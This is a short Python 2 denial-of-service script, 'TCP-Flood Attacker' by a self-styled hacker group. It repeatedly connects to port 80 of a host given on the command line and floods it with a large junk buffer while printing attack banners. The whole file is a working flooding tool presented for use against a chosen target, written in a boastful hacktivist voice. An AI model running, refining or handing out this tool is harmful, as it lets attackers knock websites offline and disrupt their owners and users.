import sys, socket, time, random
#TCP-Flood Attacker By T34CH3R HackTeam
#Ver 0.2
#We Are Legion.
def fuckPacket_Main(host):
	print "-=]T34CH3R HackTeam DDoS Attack Python Script[=-"
	print "            -=]We Are Legion.[=-"
	buff = random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("zxcvbnmasdfghjklqwertyuiop")+"XXX"*10000
	while True:	
		try:
			sock = socket.socket()
			sock.connect((host, 80))
		except:
			print "[-]Fail Connect :("
			sys.exit(1)
		
		print "[***]Attacking host: http://"+host+" [^^^]Sending super packet "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")
		sock.send(buff)
		sock.close()
def fuckPacket_Param():
	try:
		host = sys.argv[1]
	except:
		print "-=] Usage: "+sys.argv[0]+" <target host> [=-"
		sys.exit(1)
	
	fuckPacket_Main(host)
fuckPacket_Param()
